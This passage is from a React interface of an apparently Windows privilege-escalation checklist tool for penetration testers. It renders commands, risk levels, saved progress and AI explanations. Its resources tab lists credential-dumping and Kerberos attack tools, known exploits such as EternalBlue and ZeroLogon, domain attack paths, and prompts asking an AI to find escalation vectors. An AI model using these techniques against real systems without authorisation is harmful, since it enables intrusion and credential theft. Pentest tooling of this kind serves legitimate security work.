                                  <span className={"text-xs " + (checked[item.id] ? 'line-through text-ghost-text-dim' : 'text-ghost-text')}>
                                    {item.label}
                                  </span>
                                  <span className={"text-xs px-1.5 py-0.5 rounded-full border font-mono " + RISK_COLOR[item.risk] + " " + RISK_BG[item.risk]}>
                                    {item.risk}
                                  </span>
                                </div>

                                {/* Command */}
                                <div className="flex items-center gap-2 bg-ghost-bg border border-ghost-border rounded-lg px-3 py-1.5 mb-1.5">
                                  <code className="text-ghost-green text-xs font-mono flex-1 truncate selectable">{item.command}</code>
                                  <CopyBtn text={item.command} />
                                </div>

                                {/* Note */}
                                <div className="text-ghost-text-dim text-xs mb-1.5">ℹ {item.note}</div>

                                {/* References */}
                                {item.references && item.references.length > 0 && (
                                  <div className="flex flex-wrap gap-2 mb-1.5">
                                    {item.references.map((ref, idx) => (
                                      <a key={idx} href={ref} target="_blank" rel="noopener noreferrer"
                                        className="text-ghost-accent text-xs hover:text-ghost-accent-2 flex items-center gap-1 transition-colors">
                                        Ref <ExternalLink size={9} />
                                      </a>
                                    ))}
                                  </div>
                                )}

                                {/* AI hint */}
                                {aiHint[item.id] && (
                                  <div className="mt-1.5 p-2.5 bg-ghost-surface-2 border border-ghost-accent-3/25 rounded-lg text-xs text-ghost-text leading-relaxed">
                                    <span className="text-ghost-accent-3 font-semibold">🤖 AI: </span>
                                    {aiHint[item.id]}
                                  </div>
                                )}
                              </div>

                              {/* AI explain button */}
                              <button 
                                onClick={() => getHint(item)}
                                className="flex-shrink-0 flex items-center gap-1 text-xs text-ghost-text-dim hover:text-ghost-accent-3 transition-colors mt-0.5"
                                disabled={ollamaAvailable === false}
                                title={ollamaAvailable === false ? 'Ollama offline' : ''}
                              >
                                {loadingHint[item.id]
                                  ? <span className="animate-pulse text-ghost-accent-3">...</span>
                                  : <><Cpu size={11} />{aiHint[item.id] ? 'hide' : 'explain'}</>}
                              </button>
                            </div>
                          </div>
                        )
                      })}
                    </div>
                  )}
                </div>
              )
            })}
          </div>

          {searchTerm && filteredCategories.length === 0 && (
            <div className="text-center py-10 text-ghost-text-dim text-sm">
              No checks match "<span className="text-ghost-text">{searchTerm}</span>"
            </div>
          )}

          {/* Notes section */}
          {(done > 0 || notes) && (
            <div className="mt-4 p-3 bg-ghost-surface border border-ghost-border rounded-lg">
              <div className="flex items-center justify-between mb-2">
                <div className="text-ghost-text-dim text-xs font-mono flex items-center gap-1">
                  <FileText size={12} />
                  Notes
                </div>
                <button 
                  onClick={() => setEditingNote(!editingNote)}
                  className="text-xs text-ghost-text-dim hover:text-ghost-accent transition-colors"
                >
                  {editingNote ? 'Cancel' : 'Add Note'}
                </button>
              </div>
              {editingNote ? (
                <div>
                  <textarea
                    value={notes}
                    onChange={e => setNotes(e.target.value)}
                    placeholder="Add notes about your progress..."
                    rows={2}
                    className="w-full bg-ghost-bg border border-ghost-border rounded px-2 py-1 text-sm text-ghost-text font-mono focus:outline-none focus:border-ghost-accent"
                  />
                  <button
                    onClick={saveChecklist}
                    className="mt-2 px-3 py-1 bg-ghost-accent/20 text-ghost-accent text-xs font-mono rounded hover:bg-ghost-accent/30 border border-ghost-accent/30"
                  >
                    Save Notes & Progress
                  </button>
                </div>
              ) : (
                <div className="text-ghost-text-dim text-sm">
                  {notes || 'No notes added yet.'}
                </div>
              )}
            </div>
          )}
        </>
      )}

      {/* History Tab */}
      {activeTab === 'history' && (
        <div className="space-y-4">
          <div className="flex items-center justify-between flex-wrap gap-2">
            <div className="text-ghost-text-dim text-xs font-mono">
              {savedChecklists.length} saved checklists
            </div>
            <div className="flex gap-2 flex-wrap">
              <button 
                onClick={exportChecklists} 
                disabled={savedChecklists.length === 0}
                className="flex items-center gap-1 text-xs text-ghost-text-dim hover:text-ghost-accent transition-colors px-2 py-1 border border-ghost-border rounded disabled:opacity-40"
              >
                <Download size={12} /> Export
              </button>
              <button 
                onClick={() => fileInputRef.current?.click()} 
                className="flex items-center gap-1 text-xs text-ghost-text-dim hover:text-ghost-accent transition-colors px-2 py-1 border border-ghost-border rounded"
              >
                <Upload size={12} /> Import
              </button>
              <input
                ref={fileInputRef}
                type="file"
                accept=".json"
                onChange={importChecklists}
                className="hidden"
              />
              <button 
                onClick={clearAllChecklists} 
                disabled={savedChecklists.length === 0}
                className="flex items-center gap-1 text-xs text-ghost-red/60 hover:text-ghost-red transition-colors px-2 py-1 border border-ghost-red/30 rounded disabled:opacity-40"
              >
                <Trash2 size={12} /> Clear All
              </button>
            </div>
          </div>

          {savedChecklists.length === 0 ? (
            <div className="bg-ghost-surface border border-ghost-border rounded-lg p-8 text-center">
              <Shield size={32} className="text-ghost-text-dim mx-auto mb-2" />
              <div className="text-ghost-text-dim text-sm font-mono">No saved checklists</div>
              <div className="text-ghost-text-dimmer text-xs mt-1">Complete some checks and save your progress</div>
            </div>
          ) : (
            <div className="space-y-2">
              {savedChecklists.map(c => {
                const items = Object.values(c.checked).filter(Boolean).length
                return (
                  <div key={c.id} className="bg-ghost-surface border border-ghost-border rounded-lg p-3 hover:border-ghost-accent/50 transition-colors">
                    <div className="flex items-start justify-between gap-2">
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <button
                            onClick={() => loadChecklist(c)}
                            className="text-ghost-accent hover:text-ghost-accent-2 font-mono text-sm font-bold transition-colors"
                          >
                            {new Date(c.timestamp).toLocaleString()}
                          </button>
                          <span className="text-ghost-text-dim text-xs">
                            {items}/{total} checks
                          </span>
                          <span className="text-ghost-text-dim text-xs">
                            {Math.round((items/total)*100)}%
                          </span>
                          {c.favorite && (
                            <Star size={12} className="text-yellow-400" />
                          )}
                        </div>
                        {c.notes && (
                          <div className="text-ghost-text-dim text-xs mt-1">{c.notes}</div>
                        )}
                        {/* Preview of checked items */}
                        <div className="flex flex-wrap gap-1 mt-1">
                          {Object.entries(c.checked)
                            .filter(([, checked]) => checked)
                            .slice(0, 5)
                            .map(([id]) => {
                              const item = CATEGORIES.flatMap(cat => cat.items).find(i => i.id === id)
                              return item ? (
                                <span key={id} className={`text-[8px] px-1 py-0.5 rounded font-mono ${RISK_COLOR[item.risk]} ${RISK_BG[item.risk]}`}>
                                  {item.label.slice(0, 15)}...
                                </span>
                              ) : null
                            })}
                          {Object.values(c.checked).filter(Boolean).length > 5 && (
                            <span className="text-[8px] text-ghost-text-dim">+{Object.values(c.checked).filter(Boolean).length - 5} more</span>
                          )}
                        </div>
                      </div>
                      <div className="flex gap-1 flex-shrink-0">
                        <button
                          onClick={() => toggleFavorite(c.id)}
                          className="p-1 text-ghost-text-dim hover:text-yellow-400 transition-colors"
                          title="Toggle favorite"
                          aria-label="Toggle favorite"
                        >
                          <Star size={14} className={c.favorite ? 'text-yellow-400' : ''} />
                        </button>
                        <button
                          onClick={() => loadChecklist(c)}
                          className="p-1 text-ghost-text-dim hover:text-ghost-accent transition-colors"
                          title="Load checklist"
                          aria-label="Load checklist"
                        >
                          <Play size={14} />
                        </button>
                        <button
                          onClick={() => deleteChecklist(c.id)}
                          className="p-1 text-ghost-text-dim hover:text-ghost-red transition-colors"
                          title="Delete"
                          aria-label="Delete checklist"
                        >
                          <Trash2 size={14} />
                        </button>
                      </div>
                    </div>
                  </div>
                )
              })}
            </div>
          )}
        </div>
      )}

      {/* Resources Tab */}
      {activeTab === 'resources' && (
        <div className="space-y-4">
          <div className="ghost-panel p-4 rounded-xl">
            <h3 className="text-sm font-bold text-ghost-accent mb-3 flex items-center gap-2">
              <Zap size={14} /> Essential Windows Privesc Resources
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
              <div>
                <h4 className="font-semibold text-ghost-yellow mb-2">Tools</h4>
                <ul className="space-y-1.5 text-ghost-text-dim font-mono">
                  <li>• WinPEAS — Automated enumeration</li>
                  <li>• PowerUp — Privilege escalation checks</li>
                  <li>• Mimikatz — Credential dumping</li>
                  <li>• Rubeus — Kerberos attacks</li>
                  <li>• Certify — ADCS enumeration</li>
                </ul>
              </div>
              <div>
                <h4 className="font-semibold text-ghost-yellow mb-2">Common Exploits</h4>
                <ul className="space-y-1.5 text-ghost-text-dim font-mono">
                  <li>• PrintNightmare (CVE-2021-34527)</li>
                  <li>• EternalBlue (MS17-010 / CVE-2017-0144)</li>
                  <li>• Potato attacks (Juicy/Rogue)</li>
                  <li>• ZeroLogon (CVE-2020-1472)</li>
                  <li>• PetitPotam (NTLM relay)</li>
                </ul>
              </div>
            </div>
          </div>

          <div className="ghost-panel p-4 rounded-xl">
            <h3 className="text-sm font-bold text-ghost-accent-2 mb-3 flex items-center gap-2">
              <Target size={14} /> Quick Attack Paths
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
              <div className="p-3 bg-ghost-surface-2 border border-ghost-border rounded">
                <h4 className="font-bold text-ghost-red mb-1">Local Privilege Escalation</h4>
                <ul className="space-y-1 text-ghost-text-dim">
                  <li>• Unquoted service paths</li>
                  <li>• Weak service permissions</li>
                  <li>• AlwaysInstallElevated</li>
                  <li>• Token privileges (SeImpersonate)</li>
                </ul>
              </div>
              <div className="p-3 bg-ghost-surface-2 border border-ghost-border rounded">
                <h4 className="font-bold text-ghost-yellow mb-1">Domain Privilege Escalation</h4>
                <ul className="space-y-1 text-ghost-text-dim">
                  <li>• Kerberoasting</li>
                  <li>• AS-REP Roasting</li>
                  <li>• ADCS (ESC1-ESC8)</li>
                  <li>• Pass the Hash/Ticket</li>
                </ul>
              </div>
            </div>
          </div>

          <div className="ghost-panel p-4 rounded-xl">
            <h3 className="text-sm font-bold text-ghost-accent-3 mb-3 flex items-center gap-2">
              <Sparkles size={14} /> AI Commands
            </h3>
            <div className="grid grid-cols-1 gap-2">
              <div className="flex items-center gap-2 bg-ghost-bg border border-ghost-border rounded-lg px-3 py-1.5">
                <code className="text-ghost-green text-xs font-mono flex-1">Explain this command: whoami /priv</code>
                <CopyBtn text="Explain this command: whoami /priv" />
              </div>
              <div className="flex items-center gap-2 bg-ghost-bg border border-ghost-border rounded-lg px-3 py-1.5">
                <code className="text-ghost-green text-xs font-mono flex-1">How to check for unquoted service paths?</code>
                <CopyBtn text="How to check for unquoted service paths?" />
              </div>
              <div className="flex items-center gap-2 bg-ghost-bg border border-ghost-border rounded-lg px-3 py-1.5">
                <code className="text-ghost-green text-xs font-mono flex-1">Find privilege escalation vectors on Windows</code>
                <CopyBtn text="Find privilege escalation vectors on Windows" />
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}